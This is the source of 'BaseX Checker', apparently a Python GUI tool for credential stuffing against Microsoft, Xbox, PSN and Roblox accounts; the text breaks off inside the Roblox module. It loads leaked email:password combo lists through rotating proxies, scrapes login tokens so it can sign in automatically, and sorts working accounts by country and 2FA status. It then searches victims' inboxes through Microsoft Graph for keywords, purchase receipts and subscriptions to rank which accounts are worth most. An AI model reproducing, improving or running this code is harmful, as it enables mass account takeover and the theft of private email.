#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ╔══════════════════════════════════════════════════════════════╗
# ║          BaseX Checker v4.0  —  GUI Edition                 ║
# ║                                                              ║
# ║  Author   : @BASE_XE                                         ║
# ║  Channel  : https://t.me/givewayess1                         ║
# ║  © 2024 @BASE_XE — All rights reserved.                     ║
# ║  Unauthorized redistribution or resale is prohibited.       ║
# ╚══════════════════════════════════════════════════════════════╝
"""
BaseX Checker v4.0 — GUI Edition
Cold Checker-style dark UI  |  tkinter + all original checker logic
Bug fixes:
  - f-string backslash in save_country / save_keyword (Python < 3.12)
  - thread-safe log routing (no print() in workers)
  - BoundedSemaphore replaced with proper ThreadPoolExecutor everywhere
"""

import os, sys, re, time, json, random, ctypes, uuid, struct, base64, hashlib
import threading, configparser
from datetime import datetime, timedelta
from collections import deque
from urllib.parse import urlparse, parse_qs, quote, unquote
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
import urllib.parse as urlenc

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ── deps ──────────────────────────────────────────────────────────────────────
try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
except ImportError:
    os.system(f'"{sys.executable}" -m pip install requests')
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry

try:
    from bs4 import BeautifulSoup
    BS4_OK = True
except ImportError:
    BS4_OK = False

try:
    import tkinter as tk
    from tkinter import ttk, filedialog, scrolledtext, messagebox
except ImportError:
    sys.exit("tkinter not found — install python3-tk")

# ═══════════════════════════════════════════════════════════════════════════════
# PALETTE — matches Cold Checker dark theme
# ═══════════════════════════════════════════════════════════════════════════════
C = {
    'bg':       '#0d1117',
    'sidebar':  '#161b22',
    'card':     '#1c2128',
    'card_h':   '#242b35',
    'border':   '#30363d',
    'accent':   '#3b82f6',
    'accent2':  '#6366f1',
    'green':    '#22c55e',
    'orange':   '#f97316',
    'red':      '#ef4444',
    'cyan':     '#06b6d4',
    'text':     '#e6edf3',
    'muted':    '#8b949e',
    'tag_bg':   '#1a3a2a',
    'tag_fg':   '#4ade80',
    'lock_bg':  '#2a1f0e',
    'lock_fg':  '#f59e0b',
    'head':     '#21262d',
}

MODULES = [
    {'id':'hotmail',  'label':'Hotmail Inbox',      'sub':'Email',         'icon':'✉',  'color':'#06b6d4'},
    {'id':'xbox',     'label':'Xbox / Microsoft',   'sub':'Xbox network',  'icon':'⊞',  'color':'#22c55e'},
    {'id':'epig',     'label':'Epic Games Fortnite','sub':'Epic Games',    'icon':'⬡',  'color':'#a855f7'},
    {'id':'psn',      'label':'PSN Hotmail',         'sub':'PlayStation',   'icon':'⬡',  'color':'#3b82f6'},
    {'id':'roblox',   'label':'Roblox Hotmail',      'sub':'Gaming',        'icon':'◫',  'color':'#f97316'},
    {'id':'steam',    'label':'Steam',               'sub':'Gaming',        'icon':'⊙',  'color':'#1d9cf0'},
    {'id':'fortnite', 'label':'Fortnite Xbox',        'sub':'Xbox → Epic → MCP','icon':'⊛','color':'#ef4444'},
    {'id':'hotbrute', 'label':'Hotmail Bruter',      'sub':'Email',         'icon':'⊠',  'color':'#06b6d4'},
]

# ═══════════════════════════════════════════════════════════════════════════════
# CHECKER UTILITIES  (bug-fixed)
# ═══════════════════════════════════════════════════════════════════════════════
FLAG_MAP = {
    'US':'🇺🇸','GB':'🇬🇧','CA':'🇨🇦','AU':'🇦🇺','DE':'🇩🇪',
    'FR':'🇫🇷','IT':'🇮🇹','ES':'🇪🇸','BR':'🇧🇷','IN':'🇮🇳',
    'JP':'🇯🇵','KR':'🇰🇷','CN':'🇨🇳','RU':'🇷🇺','MX':'🇲🇽',
    'DZ':'🇩🇿','MA':'🇲🇦','TN':'🇹🇳','SA':'🇸🇦','EG':'🇪🇬',
    'TR':'🇹🇷','PL':'🇵🇱','NL':'🇳🇱','SE':'🇸🇪','NO':'🇳🇴',
}

STEAM_COUNTRIES = {
    "AF":"Afghanistan","AL":"Albania","DZ":"Algeria","AU":"Australia","AT":"Austria",
    "AZ":"Azerbaijan","BS":"Bahamas","BH":"Bahrain","BD":"Bangladesh","BE":"Belgium",
    "BR":"Brazil","BG":"Bulgaria","CA":"Canada","CL":"Chile","CN":"China",
    "CO":"Colombia","HR":"Croatia","CZ":"Czech Republic","DK":"Denmark","EG":"Egypt",
    "FI":"Finland","FR":"France","DE":"Germany","GR":"Greece","HK":"Hong Kong",
    "HU":"Hungary","IN":"India","ID":"Indonesia","IR":"Iran","IE":"Ireland",
    "IL":"Israel","IT":"Italy","JP":"Japan","JO":"Jordan","KZ":"Kazakhstan",
    "KW":"Kuwait","LB":"Lebanon","LT":"Lithuania","LU":"Luxembourg","MY":"Malaysia",
    "MX":"Mexico","MA":"Morocco","NL":"Netherlands","NZ":"New Zealand","NG":"Nigeria",
    "NO":"Norway","OM":"Oman","PK":"Pakistan","PE":"Peru","PH":"Philippines",
    "PL":"Poland","PT":"Portugal","QA":"Qatar","RO":"Romania","RU":"Russia",
    "SA":"Saudi Arabia","SG":"Singapore","ZA":"South Africa","ES":"Spain",
    "SE":"Sweden","CH":"Switzerland","TW":"Taiwan","TH":"Thailand","TN":"Tunisia",
    "TR":"Turkey","UA":"Ukraine","AE":"UAE","GB":"United Kingdom",
    "US":"United States","VN":"Vietnam",
}

_BAD_CHARS_RE = re.compile(r'[<>:/\\|?*]')  # compiled once, reused — no f-string backslash issue

def sanitize_filename(s: str) -> str:
    """Replace filesystem-hostile chars. Safe on all Python versions."""
    return _BAD_CHARS_RE.sub('_', s)

def flag(code):
    return FLAG_MAP.get((code or '').upper(), '🏴')

def rnd_ua():
    return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'

def normalise(line):
    line = line.strip()
    if not line or line.startswith('#'): return None
    for sep in [':', '|', ';', ',', '\t', ' ']:
        if sep in line:
            e, p = line.split(sep, 1)
            e, p = e.strip(), p.strip()
            if e and p and '@' in e: return f'{e}:{p}'
    return None

def load_combos(path):
    if not path or not os.path.exists(path): return []
    with open(path, 'r', encoding='utf-8', errors='ignore') as f:
        return [c for c in (normalise(l) for l in f) if c]

def load_proxies(path):
    if not path or not os.path.exists(path): return []
    with open(path, 'r', encoding='utf-8') as f:
        return [l.strip() for l in f if l.strip() and not l.startswith('#')]

def fmt_proxy(p):
    if not p: return None
    p = p.strip()
    if p.startswith('http'): return p
    parts = p.split(':')
    if len(parts) == 4: return f'http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}'
    if '@' in p: return f'http://{p}'
    return f'http://{p}'

def pick_proxy(proxies):
    return fmt_proxy(random.choice(proxies)) if proxies else None

def make_session(proxy=None, pool=150):
    s = requests.Session()
    retry = Retry(total=2, backoff_factor=0.3,
                  status_forcelist=[429,500,502,503,504],
                  allowed_methods=['HEAD','GET','POST','OPTIONS'])
    a = HTTPAdapter(max_retries=retry, pool_connections=pool, pool_maxsize=pool)
    s.mount('https://', a); s.mount('http://', a)
    if proxy: s.proxies = {'http': proxy, 'https': proxy}
    return s

# ── Writer (FIXED: no f-string backslash) ─────────────────────────────────────
class Writer:
    def __init__(self, d):
        self.d = d
        self._lk = Lock()
        for sub in ('Countries', 'Keywords'):
            os.makedirs(os.path.join(d, sub), exist_ok=True)

    def _w(self, path, line):
        with self._lk:
            with open(path, 'a', encoding='utf-8') as f:
                f.write(line + '\n')

    def save(self, fname, line):
        self._w(os.path.join(self.d, fname), line)

    def save_country(self, c, l):
        # FIX: variable extracted before f-string — no backslash in expression
        safe = sanitize_filename(c)
        self._w(os.path.join(self.d, 'Countries', f'{safe}.txt'), l)

    def save_keyword(self, k, l):
        # FIX: same pattern
        safe = sanitize_filename(k.strip())
        self._w(os.path.join(self.d, 'Keywords', f'{safe}.txt'), l)

def make_writer(tag):
    d = os.path.join('Results', f'{tag}_{datetime.now().strftime("%Y-%m-%d_%H-%M-%S")}')
    os.makedirs(d, exist_ok=True)
    return Writer(d), d

# ═══════════════════════════════════════════════════════════════════════════════
# MODULE 1 — HOTMAIL
# ═══════════════════════════════════════════════════════════════════════════════
LOGIN_URL = ('https://login.live.com/oauth20_authorize.srf'
             '?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf'
             '&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en')

class MSLogin:
    TO = 15
    def __init__(self, email, password, proxy=None):
        self.email, self.password = email, password
        self.session = make_session(proxy)
        self.country = self.name = 'Unknown'

    def _form(self):
        for _ in range(3):
            try:
                r = self.session.get(LOGIN_URL,
                    headers={'User-Agent':'Mozilla/5.0','Upgrade-Insecure-Requests':'1'},
                    timeout=self.TO, verify=False)
                t = r.text
                sf = (re.search(r'value=\\"(.+?)\\"',t,re.S) or
                      re.search(r'value="(.+?)"',t,re.S) or
                      re.search(r"sFTTag:'(.+?)'",t,re.S))
                up = (re.search(r'"urlPost":"(.+?)"',t,re.S) or
                      re.search(r'<form.*?action="(.+?)"',t,re.S))
                if sf and up:
                    return up.group(1).replace('&amp;','&'), sf.group(1)
            except: pass
            time.sleep(0.5)
        return None, None

    def _submit(self, url_post, sfttag):
        for _ in range(3):
            try:
                data = {'login':self.email,'loginfmt':self.email,'passwd':self.password,'PPFT':sfttag}
                r = self.session.post(url_post, data=data, allow_redirects=True, timeout=self.TO, verify=False)
                frag = parse_qs(urlparse(r.url).fragment)
                if frag.get('access_token'): return 'SUCCESS'
                txt = r.text.lower()
                if 'cancel?mkt=' in r.text:
                    ipt   = re.search(r'(?<="ipt" value=").+?(?=">)',   r.text)
                    pprid = re.search(r'(?<="pprid" value=").+?(?=">)', r.text)
                    uaid  = re.search(r'(?<="uaid" value=").+?(?=">)',  r.text)
                    act   = re.search(r'(?<=id="fmHF" action=").+?(?=" )', r.text)
                    if ipt and pprid and uaid and act:
                        sk = self.session.post(act.group(), data={'ipt':ipt.group(),'pprid':pprid.group(),'uaid':uaid.group()}, allow_redirects=True, verify=False)
                        ru = re.search(r'(?<="recoveryCancel":{"returnUrl":").+?(?=",)', sk.text)
                        if ru:
                            fin = self.session.get(ru.group(), allow_redirects=True, verify=False)
                            if parse_qs(urlparse(fin.url).fragment).get('access_token'): return 'SUCCESS'
                if any(v in r.text for v in ['recover?mkt','account.live.com/identity/confirm','/Abuse?mkt=']):
                    return '2FA'
                if any(v in txt for v in ['password is incorrect',"account doesn't exist",'sign in to your microsoft account']):
                    return 'BAD'
            except: pass
            time.sleep(0.5)
        return 'BAD'

    def login(self):
        u, s = self._form()
        return self._submit(u, s) if (u and s) else 'BAD'

    def graph_token(self):
        for scope in ['https://graph.microsoft.com/User.Read https://graph.microsoft.com/Mail.Read',
                      'https://graph.microsoft.com/Mail.Read']:
            try:
                url = (f'https://login.live.com/oauth20_authorize.srf?client_id=0000000048170EF2'
                       f'&response_type=token&scope={scope}'
                       f'&redirect_uri=https://login.live.com/oauth20_desktop.srf&prompt=none')
                r = self.session.get(url, timeout=self.TO, verify=False)
                tok = parse_qs(urlparse(r.url).fragment).get('access_token',[None])[0]
                if tok: return tok
            except: pass
        return None

    def profile(self, token):
        try:
            r = self.session.get('https://graph.microsoft.com/v1.0/me',
                headers={'Authorization':f'Bearer {token}','Content-Type':'application/json'},
                timeout=10, verify=False)
            if r.status_code == 200:
                d = r.json()
                self.country = d.get('country','Unknown') or 'Unknown'
                self.name    = d.get('displayName','Unknown') or 'Unknown'
                return True
        except: pass
        return False

    def inbox_search(self, token, keywords):
        headers = {'Authorization':f'Bearer {token}','Content-Type':'application/json'}
        total, hits = 0, []
        for kw in keywords:
            try:
                r = self.session.get(
                    f'https://graph.microsoft.com/v1.0/me/messages?$search="subject:{kw}"&$select=subject&$top=25',
                    headers=headers, timeout=10, verify=False)
                if r.status_code == 200:
                    d = r.json()
                    cnt = d.get('@odata.count', len(d.get('value',[])))
                    if cnt and cnt > 0:
                        total += cnt; hits.append(f'{kw}: {cnt}')
            except: pass
        return total, hits

def _hotmail_worker(combo, proxies, keywords, writer, cb):
    try:
        email, pw = combo.split(':', 1)
        chk = MSLogin(email.strip(), pw.strip(), pick_proxy(proxies))
        status = chk.login()
        if status == 'SUCCESS':
            tok = chk.graph_token()
            if tok: chk.profile(tok)
            country = chk.country
            combo_line = f'{email}:{pw}'
            writer.save('Valid.txt', combo_line)
            if country != 'Unknown': writer.save_country(country, combo_line)
            itotal, ihits = (chk.inbox_search(tok, keywords) if tok else (0, []))
            fg = flag(country)
            if itotal > 0:
                hs = ' | '.join(ihits)
                writer.save('Inbox.txt', f'{combo_line} | {country} | {itotal} msgs | [{hs}]')
                for h in ihits:
                    writer.save_keyword(h.split(':',1)[0], f'{combo_line} | {country} | {h}')
                cb('hit', email, f'{fg}{country} | msgs:{itotal} | {hs}')
            else:
                cb('hit', email, f'{fg}{country}')
        elif status == '2FA':
            writer.save('2FA.txt', combo)
            cb('2fa', email, '2FA required')
        else:
            cb('bad', email, 'invalid')
    except Exception as e:
        cb('err', combo.split(':',1)[0] if ':' in combo else combo, str(e)[:60])

def run_hotmail_bg(combo_file, proxy_file, keywords, threads, writer, cb_log, cb_stat, cb_done):
    combos = load_combos(combo_file)
    proxies = load_proxies(proxy_file)
    if not combos: cb_done('No combos found.'); return
    stats = {'hit':0,'2fa':0,'bad':0,'err':0,'done':0}
    lk = Lock()
    def cb(kind, email, info):
        with lk:
            stats[kind if kind in stats else 'err'] += 1
            stats['done'] += 1
        cb_log(kind, email, info)
        cb_stat(dict(stats), len(combos))
    with ThreadPoolExecutor(max_workers=threads) as ex:
        futs = [ex.submit(_hotmail_worker, c, proxies, keywords, writer, cb) for c in combos]
        for _ in as_completed(futs): pass
    cb_done(f"Done — {stats['hit']} hits | {stats['2fa']} 2FA | {stats['bad']} bad")

# ═══════════════════════════════════════════════════════════════════════════════
# MODULE 2 — XBOX
# ═══════════════════════════════════════════════════════════════════════════════
_XBOX_LOGIN = ('https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328'
               '&redirect_uri=https://login.live.com/oauth20_desktop.srf'
               '&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en')

SUB_KW = [
    ('xbox game pass ultimate','Xbox Game Pass Ultimate'),('pc game pass','PC Game Pass'),
    ('xbox game pass core','Xbox Game Pass Core'),('xbox game pass console','Xbox Game Pass Console'),
    ('game pass','Xbox Game Pass'),('ea play pro','EA Play Pro'),('ea play','EA Play'),
    ('ea access','EA Access'),('ubisoft+','Ubisoft+'),('ubisoft plus','Ubisoft+'),
    ('xbox live gold','Xbox Live Gold'),('xbox cloud gaming','Xbox Cloud Gaming'),
    ('cloud gaming','Cloud Gaming'),
]

def _traverse_subs(data):
    subs = []
    def walk(obj):
        if isinstance(obj, dict):
            if any(k in obj for k in ('nextRenewalDate','expirationDate','validTo','endDate','expiryDate')):
                s = json.dumps(obj).lower()
                for term, name in SUB_KW:
                    if term in s:
                        dv = (obj.get('nextRenewalDate') or obj.get('expirationDate') or
                              obj.get('validTo') or obj.get('endDate') or obj.get('expiryDate'))
                        ar = 'Yes' if str(obj.get('autoRenew', obj.get('isAutoRenew','False'))).lower()=='true' else 'No'
                        subs.append({'name':name,'full_date':str(dv),'auto_renew':ar}); break
            for v in obj.values(): walk(v)
        elif isinstance(obj, list):
            for i in obj: walk(i)
    walk(data); return subs

def _days_left(ds):
    try:
        ds = re.sub(r'\.\d+','',ds or '')
        if 'Z' not in ds and '+' not in ds: ds += 'Z'
        rd = datetime.fromisoformat(ds.replace('Z','+00:00'))
        return max(0, (rd - datetime.now(rd.tzinfo)).days)
    except: return 0

def _xbox_rps_token(session, email, password, proxies):
    for _ in range(5):
        try:
            r = session.get(_XBOX_LOGIN, headers={'User-Agent':'Mozilla/5.0'}, timeout=15, verify=False)
            sf = (re.search(r'value=\\"(.+?)\\"',r.text,re.S) or re.search(r'value="(.+?)"',r.text,re.S))
            up = (re.search(r'"urlPost":"(.+?)"',r.text,re.S) or re.search(r"urlPost:'(.+?)'",r.text,re.S))
            if sf and up:
                data = {'login':email,'loginfmt':email,'passwd':password,'PPFT':sf.group(1)}
                resp = session.post(up.group(1), data=data, allow_redirects=True, timeout=15, verify=False)
                if '#' in resp.url:
                    tok = parse_qs(urlparse(resp.url).fragment).get('access_token',[''])[0]
                    if tok: return tok, 'SUCCESS'
                if any(v in resp.text for v in ['recover?mkt','identity/confirm','/Abuse?mkt=']): return None, '2FA'
                if any(v in resp.text.lower() for v in ['password is incorrect',"account doesn't exist"]): return None, 'BAD'
        except: pass
        session.proxies = {'http':pick_proxy(proxies),'https':pick_proxy(proxies)} if proxies else {}
    return None, 'BAD'

def _check_xbox_subs(session, rps_token):
    try:
        xl = session.post('https://user.auth.xboxlive.com/user/authenticate',
            json={'Properties':{'AuthMethod':'RPS','SiteName':'user.auth.xboxlive.com','RpsTicket':rps_token},
                  'RelyingParty':'http://auth.xboxlive.com','TokenType':'JWT'},
            headers={'Content-Type':'application/json','Accept':'application/json'}, timeout=15, verify=False)
        js = xl.json(); xbox_tok = js.get('Token')
        if not xbox_tok: return []
        all_subs = []
        for url in ['https://subscriptions.xboxlive.com/users/me/subscriptions',
                    'https://catalog.xboxlive.com/users/me/entitlements']:
            try:
                r = session.get(url, headers={'Authorization':f'Bearer {rps_token}','x-xbl-contract-version':'2'}, timeout=10)
                if r.status_code == 200:
                    subs = _traverse_subs(r.json())
                    for s in subs:
                        d = _days_left(s['full_date'])
                        if d > 0: s['days'] = d; all_subs.append(s)
            except: pass
        return sorted(all_subs, key=lambda x: x.get('days',0), reverse=True)
    except: return []

def _xbox_worker(combo, proxies, writer, cb):
    try:
        email, pw = combo.split(':',1)
        session = requests.Session(); session.verify = False
        session.proxies = {'http':pick_proxy(proxies),'https':pick_proxy(proxies)} if proxies else {}
        rps, status = _xbox_rps_token(session, email.strip(), pw.strip(), proxies)
        if status == 'SUCCESS' and rps:
            subs = _check_xbox_subs(session, rps)
            combo_l = f'{email}:{pw}'
            if subs:
                best = subs[0]
                label = f"{best['name']} | Days:{best['days']} | AutoRenew:{best['auto_renew']}"
                fname = sanitize_filename(best['name']) + '.txt'
                writer.save(fname, f'{combo_l} | {label}')
                writer.save('Hits.txt', combo_l)
                cb('hit', email, label)
            else:
                writer.save('ValidMail.txt', combo_l)
                cb('hit', email, 'no active subs')
        elif status == '2FA':
            writer.save('2FA.txt', combo)
            cb('2fa', email, '2FA required')
        else:
            cb('bad', email, 'invalid')
    except Exception as e:
        cb('err', combo.split(':',1)[0] if ':' in combo else combo, str(e)[:60])

def run_xbox_bg(combo_file, proxy_file, threads, writer, cb_log, cb_stat, cb_done):
    combos = load_combos(combo_file)
    proxies = load_proxies(proxy_file)
    if not combos: cb_done('No combos found.'); return
    stats = {'hit':0,'2fa':0,'bad':0,'err':0,'done':0}
    lk = Lock()
    def cb(kind, email, info):
        with lk:
            stats[kind if kind in stats else 'err'] += 1
            stats['done'] += 1
        cb_log(kind, email, info)
        cb_stat(dict(stats), len(combos))
    with ThreadPoolExecutor(max_workers=threads) as ex:
        futs = [ex.submit(_xbox_worker, c, proxies, writer, cb) for c in combos]
        for _ in as_completed(futs): pass
    cb_done(f"Done — {stats['hit']} hits | {stats['2fa']} 2FA | {stats['bad']} bad")

# ═══════════════════════════════════════════════════════════════════════════════
# MODULE 3 — PSN
# ═══════════════════════════════════════════════════════════════════════════════
PSN_SENDERS = [
    'sony@txn-email.playstation.com','Sony@email.sonyentertainmentnetwork.com',
    'sony@txn-email01.playstation.com','playstation@email.sonyentertainmentnetwork.com',
    'noreply@playstation.com',
]

def _psn_ms_login(email, password):
    for _ in range(3):
        session = requests.Session()
        session.headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
        try:
            lp = session.get('https://login.live.com/', timeout=20)
            if lp.status_code != 200: continue
            ppft = re.search(r'name="PPFT"\s+value="([^"]+)"', lp.text)
            if not ppft:
                soup = BeautifulSoup(lp.text, 'html.parser') if BS4_OK else None
                ppft_val = soup.find('input',{'name':'PPFT'})['value'] if soup else None
            else: ppft_val = ppft.group(1)
            if not ppft_val: continue
            up_m = re.search(r'urlPost:\s*[\'"]([^\'"]+)[\'"]', lp.text)
            post_url = up_m.group(1).replace('\\/', '/') if up_m else 'https://login.live.com/ppsecure/post.srf'
            data = {'login':email,'loginfmt':email,'passwd':password,'PPFT':ppft_val,
                    'PPSX':'PassportR','type':'11','LoginOptions':'1'}
            resp = session.post(post_url, data=data, allow_redirects=True, timeout=20)
            fu, ft = resp.url, resp.text.lower()
            if 'identity/confirm' in fu or '2fa' in ft: return {'status':'2FA','token':None}
            if '/abuse' in fu or '/cancel' in fu: return {'status':'LOCKED','token':None}
            if 'incorrect' in ft or 'wrong' in ft: return {'status':'BAD','token':None}
            if 'access_token=' in fu:
                m = re.search(r'access_token=([^&]+)', fu)
                if m: return {'status':'SUCCESS','token':unquote(m.group(1))}
            if 'ESTSAUTH' in session.cookies.get_dict(): return {'status':'VALID_NO_TOKEN','token':None}
            return {'status':'BAD','token':None}
        except: time.sleep(random.uniform(1,2))
    return {'status':'ERROR','token':None}

class PSNSearcher:
    def __init__(self, token):
        self.session = requests.Session()
        self.session.headers['Authorization'] = f'Bearer {token}'
        self.session.headers['ConsistencyLevel'] = 'eventual'

    def search(self, q, top=50):
        msgs = []
        url = 'https://graph.microsoft.com/v1.0/me/messages'
        params = {'$search':f'"{q}"','$top':top,'$select':'body,subject,from,receivedDateTime'}
        while True:
            try:
                r = self.session.get(url, params=params, timeout=20)
                if r.status_code != 200: break
                d = r.json(); msgs.extend(d.get('value',[]))
                nl = d.get('@odata.nextLink')
                if not nl or len(msgs) >= 100: break
                url, params = nl, None
            except: break
        return msgs

    def analyze(self):
        q = ' OR '.join(f'from:"{s}"' for s in PSN_SENDERS)
        msgs = self.search(q)
        if not msgs: return None
        orders, total_spent, games, ps_plus, oids = [], 0, [], False, set()
        for m in msgs:
            body = m.get('body',{}).get('content','') or m.get('bodyPreview','')
            on = re.search(r'Order Number:\s*([A-Z0-9-]+)', body, re.I)
            am = re.search(r'\$(\d+\.?\d*)', body)
            gt = re.search(r'(?:purchased|bought|Thank you for buying)\s+["\']?([^"\']+?)["\']?', body, re.I)
            if on: orders.append(on.group(1))
            if am:
                total_spent += float(am.group(1))
                if gt: games.append(gt.group(1).strip())
            if 'playstation plus' in body.lower() or 'ps plus' in body.lower(): ps_plus = True
            for pat in [r'Online ID:\s*([a-zA-Z0-9_-]{3,20})',r'Hello,\s*([a-zA-Z0-9_-]{3,20})']:
                mm = re.search(pat, body, re.I)
                if mm: oids.add(mm.group(1))
        score = (4 if total_spent>500 else 3 if total_spent>200 else 2 if total_spent>50 else 1 if total_spent>0 else 0)
        score += (4 if len(orders)>20 else 3 if len(orders)>10 else 2 if len(orders)>3 else 1 if orders else 0)
        if ps_plus: score += 2
        if oids: score += 1
        rank = 'PREMIUM' if score>=8 else 'GOOD' if score>=5 else 'BASIC' if score>=3 else 'LOW' if score>=1 else 'NONE'
        return {'emails_count':len(msgs),'orders':len(orders),'total_spent':total_spent,
                'games':list(set(games))[:5],'ps_plus':ps_plus,'online_ids':list(oids),'rank':rank}

def _psn_worker(combo, proxies, writer, cb):
    try:
        email, pw = combo.split(':',1)
        res = _psn_ms_login(email.strip(), pw.strip())
        if res['status'] == 'SUCCESS':
            psn = PSNSearcher(res['token']).analyze() if res['token'] else None
            rank = psn['rank'] if psn else 'NO PSN'
            out = f"Email:{email} | Password:{pw} | PSN:{rank}"
            if psn:
                out += f" | Orders:{psn['orders']} | Spent:${psn['total_spent']:.2f} | PSPlus:{'Yes' if psn['ps_plus'] else 'No'}"
                if psn['online_ids']: out += f" | IDs:{','.join(psn['online_ids'])}"
            writer.save('PSN_Hits.txt', out)
            cb('hit', email, f'PSN:{rank}')
        elif res['status'] in ('2FA','LOCKED'):
            writer.save('2FA.txt', combo)
            cb('2fa', email, res['status'])
        elif res['status'] == 'VALID_NO_TOKEN':
            writer.save('Valid_No_Token.txt', combo)
            cb('hit', email, 'no token')
        else:
            cb('bad', email, 'invalid')
    except Exception as e:
        cb('err', combo.split(':',1)[0] if ':' in combo else combo, str(e)[:60])

def run_psn_bg(combo_file, proxy_file, threads, writer, cb_log, cb_stat, cb_done):
    combos = load_combos(combo_file)
    proxies = load_proxies(proxy_file)
    if not combos: cb_done('No combos found.'); return
    stats = {'hit':0,'2fa':0,'bad':0,'err':0,'done':0}
    lk = Lock()
    def cb(kind, email, info):
        with lk:
            stats[kind if kind in stats else 'err'] += 1
            stats['done'] += 1
        cb_log(kind, email, info)
        cb_stat(dict(stats), len(combos))
    with ThreadPoolExecutor(max_workers=threads) as ex:
        futs = [ex.submit(_psn_worker, c, proxies, writer, cb) for c in combos]
        for _ in as_completed(futs): pass
    cb_done(f"Done — {stats['hit']} hits | {stats['2fa']} 2FA | {stats['bad']} bad")

# ═══════════════════════════════════════════════════════════════════════════════
# MODULE 4 — ROBLOX
# ═══════════════════════════════════════════════════════════════════════════════
RBLX_CLIENT_ID = 'e9b154d0-7658-433b-bb25-6b8e0a8a7c59'

def _rblx_ms_login(email, password, proxies_dict=None):
    session = requests.Session()
    ua = rnd_ua(); PPFT = ''; urlPost = ''
    try:
        url = (f'https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?'
               f'client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code'
               f'&client_id={RBLX_CLIENT_ID}'
               f'&redirect_uri=msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D'
               f'&scope=profile+openid+offline_access+https://outlook.office.com/M365.Access')
        r = session.get(url, headers={'User-Agent':ua}, proxies=proxies_dict, timeout=30)
        rt = r.text
        sm = re.search(r'var ServerData = ({.*?});', rt, re.DOTALL)
        if sm:
            try:
                sd = json.loads(sm.group(1))
                sft = sd.get('sFTTag','')
                ppft_m = re.search(r'value="([^"]+)"', sft)
                if ppft_m: PPFT = ppft_m.group(1)
                urlPost = sd.get('urlPost','')
            except: pass
        if not PPFT:
            m = re.search(r'name="PPFT" value="([^"]+)"', rt)
            if m: PPFT = m.group(1)
        if not urlPost:
            m = re.search(r'"urlPost":"([^"]+)"', rt)
            if m: urlPost = m.group(1)
        if not PPFT or not urlPost: return None, None, 'BAD'
        ck = session.cookies.get_dict()
        ds = (f'i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&lrt=&lrtPartition='
              f'&hisRegion=&hisScaleUnit=&passwd={password}&ps=2&psRNGCDefaultType=&psRNGCEntropy='
              f'&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={PPFT}&PPSX=Passport'
              f'&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0'
              f'&isSignupPost=0&isRecoveryAttemptPost=0&i19=3772')
        ph = {'User-Agent':ua,'Content-Type':'application/x-www-form-urlencoded',
              'Origin':'https://login.live.com','Referer':r.url,
              'Cookie':f"MSPRequ={ck.get('MSPRequ','')}; MSPOK={ck.get('MSPOK','')}"}
        pr = session.post(urlPost, data=ds, headers=ph, allow_redirects=False,
                          proxies=proxies_dict, timeout=30)
        ck2 = session.cookies.get_dict()
        if '__Host-MSAAUTHP' not in ck2: return None, None, 'BAD'
        auth_code = ''
        if pr.status_code in (301,302,303,307,308):
            loc = pr.headers.get('Location','')
            if 'msauth://' in loc and 'code=' in loc:
                auth_code = loc.split('code=')[1].split('&')[0]
        if not auth_code:
            m = re.search(r'window\.location\s*=\s*["\']([^"\']+)["\']', pr.text)
            if m and 'msauth://' in m.group(1) and 'code=' in m.group(1):
                auth_code = m.group(1).split('code=')[1].split('&')[0]
        if not auth_code: return None, None, 'BAD'
        CID = ck2.get('MSPCID','').upper()
        tr = requests.post('https://login.microsoftonline.com/consumers/oauth2/v2.0/token',
            data={'client_info':'1','client_id':RBLX_CLIENT_ID,
                  'redirect_uri':'msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D',
                  'grant_type':'authorization_code','code':auth_code,
                  'scope':'profile openid offline_access https://outlook.office.com/M365.Access'},
            headers={'Content-Type':'application/x-www-form-urlencoded'},
            proxies=proxies_dict, timeout=30)
        if tr.status_code == 200:
            access_tok = tr.json().get('access_token','')
            return access_tok, CID, 'SUCCESS' if access_tok else 'BAD'
        return None, None, 'BAD'
    except: return None, None, 'BAD'

def _rblx_profile(access_tok, CID, proxies_dict=None):
    try:
        sp = {'Cvid':str(uuid.uuid4()),'Scenario':{'Name':'owa.react'},
              'EntityRequests':[{'EntityType':'Conversation','ContentSources':['Exchange'],
                'From':0,'Query':{'QueryString':'no-reply@roblox.com'},'Size':25,
                'Sort':[{'Field':'Score','SortDirection':'Desc'}]}],
              'AnswerEntityRequests':[{'Query':{'QueryString':'Roblox'},'EntityTypes':['Event'],'From':0,'Size':50}]}
        sh = {'User-Agent':'Outlook-Android/2.0','Authorization':f'Bearer {access_tok}',
              'X-AnchorMailbox':f'CID:{CID}','Accept':'application/json','Content-Type':'application/json'}
        sr = requests.post('https://outlook.live.com/search/api/v2/query?n=124&cv=a.1',
                           json=sp, headers=sh, timeout=30, proxies=proxies_dict)
        rblx_user = None; Total = '0'; Name = ''; Country = ''
        if sr.status_code == 200:
            st = sr.text
            tm = re.search(r'"Total":(\d+)', st)
            if tm: Total = tm.group(1)
            for pat in [r'account:\s*([a-zA-Z0-9_]+)',r'for\s+([a-zA-Z0-9_]+)\s+and\s+want',r'Hello,\s*([a-zA-Z0-9_]+)']:
                mm = re.search(pat, st, re.I)
                if mm: rblx_user = mm.group(1); break
            pr = requests.get('https://substrate.office.com/profileb2/v2.0/me/V1Profile',
                headers={'Authorization':f'Bearer {access_tok}','X-AnchorMailbox':f'CID:{CID}',
